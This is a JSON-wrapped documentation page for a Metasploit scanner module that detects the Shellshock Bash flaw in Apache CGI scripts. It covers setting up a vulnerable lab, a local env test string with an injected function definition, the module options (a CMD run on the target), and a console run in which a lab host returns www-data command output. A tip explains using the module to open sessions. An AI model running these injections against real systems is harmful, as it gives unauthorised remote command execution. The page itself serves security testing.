{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/scanner/http/apache_mod_cgi_bash_env","result":{"data":{"moduleMetadataJson":{"id":"140f5b48-18da-58c6-8a34-0f42e85bff36","name":"Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner","fullname":"auxiliary/scanner/http/apache_mod_cgi_bash_env","description":"This module scans for the Shellshock vulnerability, a flaw in how the Bash shell\n        handles external environment variables. This module targets CGI scripts in the\n        Apache web server by setting the HTTP_USER_AGENT environment variable to a\n        malicious function definition.\n\n        PROTIP: Use exploit/multi/handler with a PAYLOAD appropriate to your\n        CMD, set ExitOnSession false, run -j, and then run this module to create\n        sessions on vulnerable hosts.\n\n        Note that this is not the recommended method for obtaining shells.\n        If you require sessions, please use the apache_mod_cgi_bash_env_exec\n        exploit module instead.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/scanner/http/apache_mod_cgi_bash_env","documentationSlug":"/modules/documentation/auxiliary/scanner/http/apache_mod_cgi_bash_env","referencesSlug":"/modules/references/auxiliary/scanner/http/apache_mod_cgi_bash_env"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module scans for the Shellshock vulnerability, a flaw in how the Bash shell handles external\nenvironment variables. This module targets CGI scripts in the Apache web server by setting\nthe <code class=\"language-text\">HTTP_USER_AGENT</code> environment variable to a malicious function definition.</p>\n<h3 id=\"creating-a-vulnerable-environment\" style=\"position:relative;\"><a href=\"#creating-a-vulnerable-environment\" aria-label=\"creating a vulnerable environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating a Vulnerable Environment</h3>\n<p>To setup an Environment that the scanner can be run against, follow the below steps to install a\nvulnerable OS and Apache version.</p>\n<p>  To ensure that you have a vulnerable version of bash:</p>\n<ol>\n<li>Install <a href=\"http://cdimage.ubuntu.com/releases/12.04/release/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Ubuntu 12.04.5 LTS</a></li>\n<li>Log into console</li>\n<li>Confirm the host is vulnerable (see next section)</li>\n<li>Also install Apache2 from the apt repository with the following command</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">```\nsudo apt-get install apache2\n```</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<ol start=\"5\">\n<li>Enable cgi-mod in apache with the following command</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">```\nsudo ln -s /etc/apache2/mods-available/cgi.load /etc/apache2/mods-enabled/cgi.load\n```</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<ol start=\"6\">\n<li>Restart the apache service with the following command</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">```\nsudo service apache2 reload\n```</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<ol start=\"7\">\n<li>In your favorite text editor create a file (as root) in <code class=\"language-text\">/usr/lib/cgi-bin</code> called <code class=\"language-text\">test.sh</code> with the following contents:</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">```\n#!/bin/bash\nprintf &quot;Content-type: text/html\\n\\n&quot;\nprintf &quot;Test!\\n&quot;\n```</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"8\">\n<li>Set the file to be executable with the following command</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">```\nsudo chmod +x /usr/lib/cgi-bin/test.sh\n```</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"to-check-if-a-host-is-vulnerable-to-the-attack\" style=\"position:relative;\"><a href=\"#to-check-if-a-host-is-vulnerable-to-the-attack\" aria-label=\"to check if a host is vulnerable to the attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>To check if a host is vulnerable to the attack</h3>\n<ol>\n<li>Run (on the host)</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">```\nenv &#39;x=() { :;}; echo vulnerable&#39; &#39;BASH_FUNC_x()=() { :;}; echo vulnerable&#39; bash -c &quot;echo test&quot;\n```</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<ol start=\"2\">\n<li>The shell will return the below text if the environment is vulnerable</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">``` \nvulnerable\nbash: BASH_FUNC_x(): line 0: syntax error near unexpected token `)&#39;   \nbash: BASH_FUNC_x(): line 0: `BASH_FUNC_x() () { :;}; echo vulnerable&#39;\nbash: error importing function definition for `BASH_FUNC_x&#39;\ntest\n```</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Do: run <code class=\"language-text\">msfconsole</code></li>\n<li>Do: use <code class=\"language-text\">auxiliary/scanner/http/apache_mod_cgi_bash_env</code></li>\n<li>Do: set <code class=\"language-text\">RHOSTS [IP]</code></li>\n<li>Do: set <code class=\"language-text\">TARGETURI [URI]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>CMD</strong></p>\n<p>This is the command that will be run by the scanner. The default setting is <code class=\"language-text\">/usr/bin/id</code>.</p>\n<p><strong>CVE</strong></p>\n<p>This is the CVE that will be used to exploit the vulnerability.\nThe default setting is <code class=\"language-text\">CVE-2014-6271</code> but valid options are <code class=\"language-text\">CVE-2014-6271</code> or <code class=\"language-text\">CVE-2014-6278</code>.</p>\n<p><strong>HEADER</strong></p>\n<p>This is the user agent string that is sent when the module is run. The default setting is <code class=\"language-text\">User-Agent</code>.</p>\n<p><strong>METHOD</strong></p>\n<p>This is HTTP method used by the module.  The default setting is <code class=\"language-text\">GET</code>.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubuntu-12045-lts-on-apache-2222\" style=\"position:relative;\"><a href=\"#ubuntu-12045-lts-on-apache-2222\" aria-label=\"ubuntu 12045 lts on apache 2222 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 12.04.5 LTS on Apache 2.2.22</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use auxiliary/scanner/http/apache_mod_cgi_bash_env\nmsf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) &gt; set RHOSTS 172.16.131.134\nRHOSTS =&gt; 172.16.131.134\nmsf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) &gt; set TARGETURI /cgi-bin/test.sh\nTARGETURI =&gt; /cgi-bin/test.sh\nmsf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) &gt; exploit\n\n[+] uid=33(www-data) gid=33(www-data) groups=33(www-data)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"140f5b48-18da-58c6-8a34-0f42e85bff36"}}}